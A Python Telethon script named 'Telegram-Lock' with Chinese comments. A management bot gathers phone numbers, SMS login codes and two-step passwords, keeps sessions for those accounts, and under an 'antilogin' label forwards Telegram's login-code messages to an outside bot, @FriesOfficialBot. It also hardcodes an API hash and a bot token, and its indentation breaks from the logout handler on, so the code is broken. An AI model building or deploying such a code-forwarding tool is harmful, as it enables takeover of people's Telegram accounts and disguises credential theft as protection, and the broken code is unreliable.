import asyncio
import platform
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneNumberInvalidError, AuthKeyDuplicatedError
)
import re
import logging

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

# 你的API凭证
API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
FORWARD_BOT_USERNAME = "@FriesOfficialBot"

# 存储结构
accounts = {}       # {手机号: {client实例, anti_login开关}}
user_states = {}    # 登录流程临时缓存
PHONE_REGEX = re.compile(r'^\+\d{10,15}$')

# 绑定单个账号监听（原版转发逻辑完全保留）
def setup_client_handlers(client, phone):
    # 原功能：self check
    @client.on(events.NewMessage(outgoing=True))
    async def handle_self_check(event):
        if event.message.text and event.message.text.lower() == "self check":
            await event.message.edit(text="self checked!")

    # 原功能：查询转发开关
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def check_anti_login(event):
        status = "on" if accounts[phone]["anti_login"] else "off"
        await event.message.edit(text=f"Anti-login is {status}.")

    # 原功能：开启转发
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable_anti_login(event):
        accounts[phone]["anti_login"] = True
        await event.message.edit(text="Anti-login turned on successfully.")

    # 原功能：关闭转发
    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable_anti_login(event):
        accounts[phone]["anti_login"] = False
        await event.message.edit(text="Anti-login has been successfully disabled.")

    # 原功能：监听777000验证码自动转发
    @client.on(events.NewMessage(from_users=[777000]))
    async def forward_anti_login(event):
        if accounts[phone]["anti_login"]:
            try:
                bot_entity = await client.get_entity(FORWARD_BOT_USERNAME)
                await client.forward_messages(bot_entity, event.message)
                logger.info(f"[{phone}] 验证码已转发")
            except Exception as e:
                logger.error(f"[{phone}] 转发失败: {str(e)}")

# 全局机器人，接收所有管理指令（addphone / listphone / delphone / logout）
bot_client = TelegramClient(StringSession(), API_ID, API_HASH)

@bot_client.on(events.NewMessage(pattern="/start"))
async def cmd_start(event):
    help_text = """📖 Telegram-Lock 完整指令列表
【基础转发控制】
self check       程序存活检测
antilogin        查看验证码转发开关
antilogin on     开启验证码自动转发
antilogin off    关闭验证码自动转发

【账号管理（机器人私聊发送）】
/addphone +8613800138000    添加并登录手机号
/listphone                  查看所有已登录账号
/delphone +8613800138000    删除本地账号会话
/logout +8613800138000      远程登出该账号
"""
    await event.reply(help_text)

# 添加手机号登录
@bot_client.on(events.NewMessage(pattern="/addphone (.+)"))
async def cmd_addphone(event):
    phone = event.pattern_match.group(1).strip()
    if not PHONE_REGEX.match(phone):
        await event.reply("❌ 手机号格式错误，示例：/addphone +8613800138000")
        return
    if phone in accounts:
        await event.reply("⚠️ 该手机号已添加，无需重复登录")
        return
    # 创建会话文件
    session_name = f"session_{phone.replace('+','')}"
    new_client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await new_client.connect()
        sent_code = await new_client.send_code_request(phone)
        user_states[event.sender_id] = {
            "client": new_client,
            "phone": phone,
            "code_hash": sent_code.phone_code_hash,
            "step": "input_code"  # 当前流程阶段：输入短信验证码
        }
        await event.reply(f"✅ 验证码已发送至 {phone}\n请直接回复数字验证码完成登录")
    except PhoneNumberInvalidError:
        await event.reply("❌ 无效手机号")
    except AuthKeyDuplicatedError:
        await event.reply("❌ 该账号已在别处登录")
    except Exception as e:
        await event.reply(f"❌ 发送验证码失败：{str(e)}")

# 接收登录验证码 / 二级密码（支持两步验证）
@bot_client.on(events.NewMessage)
async def input_code(event):
    if event.sender_id not in user_states:
        return
    state = user_states[event.sender_id]
    text = event.text.strip()

    # 阶段1：输入短信验证码
    if state["step"] == "input_code":
        if not text.isdigit():
            return
        try:
            await state["client"].sign_in(
                phone_code_hash=state["code_hash"],
                code=text
            )
            # 登录成功，无二次密码
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            setup_client_handlers(state["client"], state["phone"])
            del user_states[event.sender_id]
            await event.reply(f"🎉 {state['phone']} 登录成功！发送 antilogin on 开启转发")
        except SessionPasswordNeededError:
            # 需要二级密码，切换流程阶段
            state["step"] = "input_password"
            await event.reply("🔐 该账号开启两步验证，请回复你的二级登录密码")
        except PhoneCodeInvalidError:
            await event.reply("❌ 验证码错误，请重新 /addphone")
            del user_states[event.sender_id]
        except Exception as err:
            await event.reply(f"❌ 登录失败：{str(err)}")
            del user_states[event.sender_id]

    # 阶段2：输入两步验证二级密码
    elif state["step"] == "input_password":
        try:
            await state["client"].sign_in(password=text)
            # 输入二级密码登录成功
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            setup_client_handlers(state["client"], state["phone"])
            del user_states[event.sender_id]
            await event.reply(f"🎉 {state['phone']} 二级密码验证通过，登录成功！发送 antilogin on 开启转发")
        except Exception as err:
            await event.reply(f"❌ 二级密码错误或异常：{str(err)}\n请重新 /addphone 发起登录")
            del user_states[event.sender_id]

# 查看所有已登录号码
@bot_client.on(events.NewMessage(pattern="/listphone"))
async def cmd_listphone(event):
    if not accounts:
        await event.reply("📭 暂无已登录手机号，请 /addphone 添加")
        return
    text = "📋 已登录账号列表：\n"
    for p, info in accounts.items():
        status = "🟢转发开启" if info["anti_login"] else "🔴转发关闭"
        text += f"- {p} | {status}\n"
    await event.reply(text)

# 删除本地会话
@bot_client.on(events.NewMessage(pattern="/delphone (.+)"))
async def cmd_delphone(event):
    phone = event.pattern_match.group(1).strip()
    if phone not in accounts:
        await event.reply("❌ 未找到该手机号记录")
        return
    # 断开连接
    await accounts[phone]["client"].disconnect()
    del accounts[phone]
    # 删除会话文件
    import os
    sess_file = f"session_{phone.replace('+','')}.session"
    if os.path.exists(sess_file):
        os.remove(sess_file)
    await event.reply(f"🗑 {phone} 本地会话已彻底删除")

# 远程登出账号
@bot_client.on(events.NewMessage(pattern="/logout (.+)"))
async def cmd_logout(event):
    phone = event.pattern_match.group(1).strip()
     if phone not in accounts:
         await event.reply("❌ 未找到该手机号")
         return
     try:
         await accounts[phone]["client"].log_out()
         await accounts[phone]["client"].disconnect()
         del accounts[phone]
         import os
         sess_file = f"session_{phone.replace('+','')}.session"
         if os.path.exists(sess_file):
             os.remove(sess_file)
         await event.reply(f"🚪 {phone} 已远程登出，所有设备下线")
     except Exception as e:
         await event.reply(f"❌ 登出失败：{str(e)}")
 # 程序主入口
 async def main():
     print("🤖 Telegram-Lock 启动成功，等待指令...")
     await bot_client.start(bot_token=BOT_TOKEN)
     print("✅ 管理机器人在线，私聊 /start 查看指令")
     # 常驻循环保活
     while True:
         await asyncio.sleep(1 / 60)
 if platform.system() == "Emscripten":
     asyncio.ensure_future(main())
 else:
     if __name__ == "__main__":
         asyncio.run(main())
